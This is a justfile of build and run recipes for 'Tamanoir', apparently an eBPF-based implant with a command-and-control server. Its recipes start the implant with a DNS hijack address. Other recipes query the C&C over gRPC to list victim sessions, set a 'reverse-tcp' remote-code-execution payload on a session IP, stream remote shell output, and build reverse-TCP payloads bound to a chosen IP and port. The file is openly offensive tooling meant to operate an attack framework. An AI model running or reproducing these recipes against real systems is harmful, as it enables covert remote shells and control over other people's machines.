set export
_default:
    @just --list


_build-ebpf:
    cd tamanoir-ebpf && cargo build --release


# Build Tamanoir
build-tamanoir:
    just _build-ebpf 
    cargo build -p tamanoir --release

# Build C&C server
build-c2:
    cargo build -p tamanoir-c2 --release

# Run Tamanoir
run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
    RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}

# Talk to the C&C server
c2_list_rce c2ip="192.168.1.15":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.Rce/ListAvailableRce
c2_list_services c2ip="192.168.1.15":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto  '{{c2ip}}:50051' list 
c2_watch c2ip="192.168.1.15":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.Session/WatchSessions
c2_remote_shell_watch c2ip="192.168.1.15":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.RemoteShell/WatchShellStdOut
c2_set_rce c2ip="192.168.1.15" session_ip="192.168.1.180" rce="reverse-tcp":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{c2ip}}:50051' tamanoir.Rce/SetSessionRce
c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{c2ip}}:50051' tamanoir.Rce/DeleteSessionRce

#run c2 server
c2_run:
    sudo systemctl stop systemd-resolved && RUST_LOG=debug sudo -E ./target/release/tamanoir-c2 start

#rce build (run on c2 server)
rce_build_reverse_tcp :
    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=127.0.0.1 PORT=8082"
rce_build_hello :
    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello


_atoi ipv4_address:
	#!/usr/bin/env bash
	IP={{ipv4_address}}; IPNUM=0
	for (( i=0 ; i<4 ; ++i )); do
	((IPNUM+=${IP%%.*}*$((256**$((3-${i}))))))
	IP=${IP#*.}
	done
	echo $IPNUM 

